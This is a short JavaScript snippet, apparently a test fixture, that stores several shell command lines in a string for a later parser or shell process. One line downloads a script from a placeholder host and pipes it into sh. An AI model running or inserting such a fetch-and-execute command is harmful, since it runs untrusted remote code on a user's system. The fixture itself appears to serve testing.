// These commands are source for a later shell process, not calls made here.
const payload = `curl https://example.invalid/stage.sh | sh
bash -c 'echo staged'
MODE=quiet sh deploy.sh
sh plain.sh
dash alternate.sh
. sourced.sh`;
